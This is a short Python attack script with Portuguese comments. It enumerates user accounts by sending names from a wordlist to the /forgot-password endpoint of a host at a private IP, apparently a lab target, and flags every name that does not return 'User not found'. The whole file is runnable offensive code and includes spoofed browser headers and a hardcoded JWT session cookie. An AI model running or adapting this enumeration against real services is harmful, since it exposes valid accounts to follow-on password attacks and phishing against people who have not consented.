import requests
import argparse

# Configurações da API
url = "http://192.168.2.129/api/v2/forgot-password"
headers = {
    "Accept-Language": "en-US,en;q=0.9",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
    "Content-Type": "application/json",
    "Accept": "*/*",
    "Origin": "http://192.168.2.129",
    "Referer": "http://192.168.2.129/forgot-password",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
    "Cookie": "token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoyLCJ1c2VybmFtZSI6InNtaXRoIiwiaXNfYWRtaW4iOmZhbHNlLCJpYXQiOjE3NTUzOTYxOTd9.cu0dKweGj-mTBgnK_ceT88gySolDJdfzMx_rXD9b23U"
}

def enumerar_usuarios(caminho_arquivo):
    try:
        with open(caminho_arquivo, "r") as arquivo:
            for linha in arquivo:
                username = linha.strip()
                if not username:
                    continue

                payload = {"username": username}
                response = requests.post(url, json=payload, headers=headers)

                try:
                    data = response.json()
                    if data.get("message") != "User not found":
                        print(f"[✔] Usuário válido encontrado: {username}")
                        print("Resposta:", data)
                except ValueError:
                    continue
    except FileNotFoundError:
        print(f"[!] Arquivo não encontrado: {caminho_arquivo}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Enumeração de usuários via /forgot-password")
    parser.add_argument("--lista", required=True, help="Caminho para o arquivo de usuários")
    args = parser.parse_args()

    enumerar_usuarios(args.lista)
